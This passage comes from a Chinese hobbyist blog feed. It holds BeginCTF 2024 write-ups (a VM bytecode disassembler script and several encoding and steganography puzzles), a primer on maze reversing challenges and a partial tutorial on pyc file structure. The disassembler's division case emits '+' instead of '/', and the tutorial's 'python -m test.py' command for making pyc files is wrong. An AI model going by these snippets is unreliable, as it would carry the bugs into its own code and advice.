<span class="built_in">open</span> (<span class="string">&quot;D:\\opcode.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_to_int</span>(<span class="params">a,b,c,d</span>):</span><br><span class="line">    <span class="keyword">return</span> a|(b&lt;&lt;<span class="number">8</span>)|(c&lt;&lt;<span class="number">16</span>)|(d&lt;&lt;<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">op_list=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">3643</span>:</span><br><span class="line">    k=byte_to_int(bincode[<span class="number">4</span>*i],bincode[<span class="number">4</span>*i+<span class="number">1</span>],bincode[<span class="number">4</span>*i+<span class="number">2</span>],bincode[<span class="number">4</span>*i+<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">match</span> k:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                add_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(add_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(add_list[<span class="number">1</span>])+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(add_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            sub_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                sub_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(sub_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(sub_list[<span class="number">1</span>])+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(sub_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            mul_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                mul_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(mul_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(mul_list[<span class="number">1</span>])+<span class="string">&#x27;*&#x27;</span>+<span class="built_in">str</span>(mul_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            div_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">4</span>,<span class="number">1</span>):</span><br><span class="line">                div_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="built_in">str</span>(div_list[<span class="number">0</span>])+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">str</span>(div_list[<span class="number">1</span>])+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(div_list[<span class="number">2</span>]))</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            op_list.append(<span class="string">&quot;in_pointer=0&quot;</span>)</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            op_list.append(<span class="string">&quot;out_pointer=0&quot;</span>)</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            popin_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                popin_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;popin &quot;</span>+<span class="built_in">str</span>(popin_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(popin_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            popout_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                popout_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;popout &quot;</span>+<span class="built_in">str</span>(popout_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(popout_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            read_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">2</span>,<span class="number">1</span>):</span><br><span class="line">                read_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            <span class="keyword">if</span>(read_list[<span class="number">0</span>]&lt;=<span class="number">199</span>):</span><br><span class="line">                op_list.append(<span class="string">&quot;read &quot;</span>+<span class="built_in">str</span>(read_list[<span class="number">0</span>]))</span><br><span class="line">            i+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            wri_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">2</span>,<span class="number">1</span>):</span><br><span class="line">                wri_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;write &quot;</span>+<span class="built_in">str</span>(wri_list[<span class="number">0</span>]))</span><br><span class="line">            i+=<span class="number">2</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            jmp_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                jmp_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;jmp &quot;</span>+<span class="built_in">str</span>(jmp_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(jmp_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            njmp_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                njmp_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;njmp &quot;</span>+<span class="built_in">str</span>(njmp_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(njmp_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">            len_list=[]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                len_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;len &quot;</span>+<span class="built_in">str</span>(len_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(len_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\opcode.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    [fp.write(<span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span>  item <span class="keyword">in</span> op_list]</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>汇编有点长主逻辑就只是一个线性方程式，用z3一把梭，这个留给大家自己尝试了</p><h3 id="stick-game"><a href="#stick-game" class="headerlink" title="stick game"></a>stick game</h3><p>修改得分（web题？</p><h4 id="考点：Js，ob混淆"><a href="#考点：Js，ob混淆" class="headerlink" title="考点：Js，ob混淆"></a>考点：Js，ob混淆</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208010936245.png" alt="image-20240208010936245"></p><p>想法：<a href="https://linmur.top/post/beginctf-2024-reverse-writeup/">https://linmur.top/post/beginctf-2024-reverse-writeup/</a></p><h3 id="真龙之力（不会"><a href="#真龙之力（不会" class="headerlink" title="真龙之力（不会"></a>真龙之力（不会</h3><h4 id="java？贴个题解"><a href="#java？贴个题解" class="headerlink" title="java？贴个题解"></a>java？贴个题解</h4><p><a href="https://www.yuque.com/u37581038/mrtw91/be9vb75fxnmah7s5?singleDoc#Fw1my">https://www.yuque.com/u37581038/mrtw91/be9vb75fxnmah7s5?singleDoc#Fw1my</a></p><h4 id="考点：XTEA，Mobile，Mobile调试"><a href="#考点：XTEA，Mobile，Mobile调试" class="headerlink" title="考点：XTEA，Mobile，Mobile调试"></a>考点：XTEA，Mobile，Mobile调试</h4><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tupper"><a href="#tupper" class="headerlink" title="tupper"></a>tupper</h3><p>用这个网站讲附加拼接的字符串转化为图片，即得到flag <a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><p>又学到了一种加密方式。。</p><h3 id="devil’s-word"><a href="#devil’s-word" class="headerlink" title="devil’s word"></a>devil’s word</h3><p>看附件：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leu lia leu ng leu cai leu jau leu e cai b cai jau sa leng cai ng ng f leu b leu e sa leng cai cai ng f cai cai sa sa leu e cai a leu bo leu f cai ng ng f leu sii leu jau sa sii leu c leu ng leu sa cai sii cai d</span><br></pre></td></tr></table></figure><p>看题目”魔鬼的语言”,搜一下猜想是温州话，其实就是温州话的0-9发音,单个字母就表示单个字母(无语了,当时没想到)。根据温州话的发音，得到这个对应关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">leng 0</span><br><span class="line">lia 2</span><br><span class="line">sa 3</span><br><span class="line">sii 4</span><br><span class="line">ng 5</span><br><span class="line">leu 6</span><br><span class="line">cai 7</span><br><span class="line">bo 8</span><br><span class="line">jau 9</span><br></pre></td></tr></table></figure><p>赛博厨子解码得到flag</p><h3 id="你知道中国文化吗1-0"><a href="#你知道中国文化吗1-0" class="headerlink" title="你知道中国文化吗1.0"></a>你知道中国文化吗1.0</h3><p>文本24个字符分一组→base32解码→八卦转8进制→8进制转字符串→字符串转社会主义编码→社会主义解码→字符串栅栏解密得到最后的flag。</p><p>八卦对应数字:</p><p>☰0<br>☱1<br>☲2<br>☳3<br>☴4<br>☵5<br>☶6<br>☷7 </p><p>其中base32解码脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;附件.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = f.readline()</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        a = a.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = base64.b32decode(a)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;八卦.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> m:</span><br><span class="line">            m.write(b.decode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题麻烦的地方就是有的分组里面有特殊字符 $ &amp; @,这些特殊字符需要替换成大写英文字母或者数字才能正确编码，这里的一个思路就是找有没有相似的分组，将特殊字符替换成对应位置的字符即可。(一个特殊字符替换成多个字符都有可能正确解码为八卦符，但是这样好像并不影响结果)</p><h3 id="下一站上岸！"><a href="#下一站上岸！" class="headerlink" title="下一站上岸！"></a>下一站上岸！</h3><p>题目描述: 某同学在考公的时候看到这样一道题，发现自己怎么也找不到图形的共同特征或规律你能帮帮他吗？</p><p>给的图片:<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206234443538.png" alt="image-20240206234443538"></p><p>zsteg图片，发现隐写内容:</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206234456075.png" alt="image-20240206234456075"></p><p>即: 5o+Q56S6OuaRqeaWr+WvhueggQ&#x3D;&#x3D;</p><p>base64解密得到(base64编码由a-zA-Z0-9+&#x2F;组成):</p><p>根据每个图形的交点数得到: 221022201122120120111011110222012101<br>将0替换成’ ‘ 1替换成’.’ 2替换成’-‘再解码得到flag<br>(至于为什么这么替换一共6种情况可以fuzz一下)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BeginCTF-2024冬&quot;&gt;&lt;a href=&quot;#BeginCTF-2024冬&quot; class=&quot;headerlink&quot; title=&quot;BeginCTF 2024冬&quot;&gt;&lt;/a&gt;BeginCTF 2024冬&lt;/h1&gt;&lt;p&gt;写的题不多，从师傅们写的特别好的wp们学到了</summary>
      
    
    
    
    
    <category term="begin 逆向" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/begin-%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>迷宫及数独问题</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/%E8%BF%B7%E5%AE%AB%EF%BC%8C%E6%95%B0%E7%8B%AC/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/%E8%BF%B7%E5%AE%AB%EF%BC%8C%E6%95%B0%E7%8B%AC/</id>
    <published>2024-02-08T16:00:00.000Z</published>
    <updated>2024-03-02T08:36:26.666Z</updated>
    
    <content type="html"><![CDATA[<p><strong>迷宫及数独问题</strong></p><p><strong>迷宫问题</strong></p><p>迷宫类题目，出题人会在程序中构造一个迷宫。该迷宫一般由各种符号构成，一些符号表示<strong>墙壁</strong>，一些</p><p>符号表示<strong>可以行走的路</strong>，并标定<strong>入口</strong>和<strong>出口</strong>。</p><p>程序依据解题者输入的字符串来走迷宫（如有的题目以 w&#x2F;s&#x2F;a&#x2F;d 字符分别表示 向上&#x2F;向下&#x2F;向左&#x2F;向右 行</p><p>走一格），如果该字符串满足以<strong>最短路径</strong>从入口走到出口，并且中间<strong>没有任何碰壁行为</strong>，则获得 flag。</p><p>迷宫问题有以下特点:</p><p>在内存中布置一张 “地图”（通常是一个字符串）</p><p>将用户输入限制在少数几个字符范围内</p><p>一般只有一个迷宫入口和一个迷宫出口</p><p>布置的地图可以由可显字符 (比如 # 和 * ) 组合而成 (这非常明显, 查看字符串基本就知道这是个迷宫题</p><p>了)，也可以单纯用不可显的十六进制值进行表示。可以将地图直接组成一条非常长的字符串，或是一行</p><p>一行分开布置。如果是一行一行分开布置的话，因为迷宫一般都会比较大，所以用于按行(注意, 布置并</p><p>非按顺序布置, 每行都对应一个具体的行号, 你需要确定行号才能还原迷宫地图) 布置迷宫的函数会明显</p><p>重复多次。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172123084.png" alt="image-20240209172123084"></p><p>而被限制的字符通常会是一些方便记忆的组合， 比如 w&#x2F;s&#x2F;a&#x2F;d , h&#x2F;j&#x2F;k&#x2F;l , l&#x2F;r&#x2F;u&#x2F;d 这样的类似组合.</p><p>当然各个键具体的操作需要经过分析判断。对于二维的地图， 一般作者都会设置一个 X坐标 和一个 Y</p><p>坐标 用于保存当前位置. 我们也可以根据这个特点来入手分析。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172133014.png" alt="image-20240209172133014"></p><p>一般情况下， 迷宫是只有 1 个入口和 1 个出口 ，像入口在最左上角 (0, 0) 位置, 而出口在最右下角</p><p>(max_X, max_Y) 处。但也有可能是出口在迷宫的正中心，用一个 Y 字符表示等等。解答迷宫题的条</p><p>件也是需要根据具体情况判断的。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172149912.png" alt="image-20240209172149912"></p><p>当然迷宫的走法可能不止 1 条 ，也有情况是有多条走法， 但是要求某一个走法比如说代价最小。那么</p><p>这就可以变相为一个算法问题（搜索算法）。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172208313.png" alt="image-20240209172208313"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;迷宫及数独问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;迷宫问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;迷宫类题目，出题人会在程序中构造一个迷宫。该迷宫一般由各种符号构成，一些符号表示&lt;strong&gt;墙壁&lt;/strong&gt;，一些&lt;/p&gt;
&lt;p&gt;符号表示&lt;s</summary>
      
    
    
    
    
    <category term="RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Python逆向</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/04/python%E9%80%86%E5%90%91/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/04/python%E9%80%86%E5%90%91/</id>
    <published>2024-02-03T16:00:00.000Z</published>
    <updated>2024-02-05T04:54:05.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python逆向"><a href="#Python逆向" class="headerlink" title="Python逆向"></a>Python逆向</h1><h2 id="pyc文件"><a href="#pyc文件" class="headerlink" title="pyc文件"></a>pyc文件</h2><h3 id="创建及使用"><a href="#创建及使用" class="headerlink" title="创建及使用"></a>创建及使用</h3><p>pyc 文件是 python 在编译 *.py 文件过程中出现的<strong>主要中间过程</strong>文件，是一种<strong>二进制</strong>文件，是一种bytecode<strong>。pyc 文件是可以由 <strong>python</strong> <strong>虚拟机</strong>直接执行的程序。因此分析 <strong>pyc</strong> <strong>文件的文件结构</strong>对于实现 pyc 反编译就显得十分重要。另外，</strong>pyc** <strong>的内容，是跟</strong> <strong>python</strong> <strong>的版本相关的</strong>，不同版本编译后的pyc 文件是不同的，3.8 编译的 pyc 文件，3.7 版本的 python 是无法执行的。</p><p>先写个 test.py：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">v1, v2</span>):</span><br><span class="line"><span class="keyword">return</span> v1 + v2</span><br></pre></td></tr></table></figure><p>我们可以通过 py_compile 模块来生成 pyc 文件：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> py_compile <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">compile</span>(<span class="string">&quot;test.py&quot;</span>)</span><br></pre></td></tr></table></figure><p>或者直接通过命令行 python -m test.py 生成 pyc。</p><p>两种操作都会在当前目录下新建一个 <strong>pycache</strong> 目录，其中存放着 test.cpython-版本号.pyc 。</p><p>如果有一个现成的 pyc 文件，要如何导入它呢？</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line">test = SourcelessFileLoader(</span><br><span class="line"><span class="string">&quot;test&quot;</span>, <span class="string">&quot;__pycache__/test.cpython-38.pyc&quot;</span></span><br><span class="line">).load_module()</span><br><span class="line"><span class="built_in">print</span>(test.a)</span><br><span class="line"><span class="built_in">print</span>(test.add(<span class="number">1</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a><strong>文件结构</strong></h3><p>pyc 文件在创建的时候都会往里面写入如下内容：</p><p><strong>1. magic number</strong></p><p>这是 Python 定义的一个整数值，不同版本的 Python 会定义不同的 magic number，这个值是为了保证 Python 能够加载正确的 pyc。</p><p>比如 Python3.7 不会加载 3.6 版本的 pyc，因为 Python 在加载 pyc 文件的时候会首先检测该 pyc 的magic number。如果和自身的 magic number 不一致，则拒绝加载。</p><p><strong>2.</strong> <strong>创建时间戳</strong></p><p>这个很好理解，在加载 pyc 之前会先比较源代码的最后修改时间和 pyc 文件的写入时间。如果 pyc 文件的写入时间比源代码的修改时间要早，说明在生成 pyc 之后，源代码被修改了，那么会重新编译并写入pyc，而反之则会直接加载已存在的 pyc。</p><p><strong>3. py</strong> <strong>文件的大小</strong></p><p>py 文件的大小也会被记录在 pyc 文件中。</p><p><strong>4. PyCodeObject</strong> <strong>对象</strong></p><p>编译之后的 PyCodeObject 对象，并且是序列化之后再存储。因此 pyc 文件的结构如下：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204124547436.png" alt="image-20240204124547436"></p><p>以上是 Python 3.7+ 的 pyc 文件结构，如果版本低于 3.7，那么开头没有 4 个 \x00。我们实际验</p><p>证一下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> importlib.util <span class="keyword">import</span> MAGIC_NUMBER</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;__pycache__/test.cpython-38.pyc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="comment"># 0 ~ 4 字节是 MAGIC NUMBER</span></span><br><span class="line"><span class="built_in">print</span>(data[: <span class="number">4</span>]) <span class="comment"># b&#x27;U\r\r\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(MAGIC_NUMBER) <span class="comment"># b&#x27;U\r\r\n&#x27;</span></span><br><span class="line"><span class="comment"># 4 ~ 8 字节是 4 个 \x00</span></span><br><span class="line"><span class="built_in">print</span>(data[<span class="number">4</span>: <span class="number">8</span>]) <span class="comment"># b&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 8 ~ 12 字节是 pyc 的写入时间（小端存储），一个时间戳</span></span><br><span class="line">ts = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="number">8</span>: <span class="number">12</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(ts) <span class="comment"># 1685686081</span></span><br><span class="line"><span class="built_in">print</span>(datetime.fromtimestamp(ts)) <span class="comment"># 2023-06-02 14:08:01</span></span><br><span class="line"><span class="comment"># 12 ~ 16 字节是 py 文件的大小</span></span><br><span class="line"><span class="built_in">print</span>(struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="number">12</span>: <span class="number">16</span>])[<span class="number">0</span>]) <span class="comment"># 47</span></span><br></pre></td></tr></table></figure><p>结果和我们分析的一样，因此对于任何一个 pyc 文件来说，前 16 字节是固定的（如果 Python 低于3.7，那么前 12 个字节是固定的）。</p><p>16 个字节往后就是 PyCodeObject 对象，并且是序列化之后的，因为该对象显然无法直接存在文件中。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;__pycache__/test.cpython-38.pyc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="comment"># 通过 marshal.loads 反序列化</span></span><br><span class="line">code = marshal.loads(data[<span class="number">16</span>:]) <span class="comment"># 此时就拿到了 py 文件编译之后的 PyCodeObject</span></span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;code object &lt;module&gt; at 0x..., file &quot;test.py&quot;, line 1&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 查看字节码</span></span><br><span class="line"><span class="built_in">print</span>(code.co_code)</span><br><span class="line"><span class="comment"># 查看常量池</span></span><br><span class="line"><span class="built_in">print</span>(code.co_consts)</span><br><span class="line"><span class="comment"># 符号表</span></span><br><span class="line"><span class="built_in">print</span>(code.co_names)</span><br></pre></td></tr></table></figure><p>既然我们可以根据 pyc 文件反推出 PyCodeObject，那么能否手动构建 PyCodeObject 然后生成 pyc呢？来试一下。例如我们想实现如下的 py 文件：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span 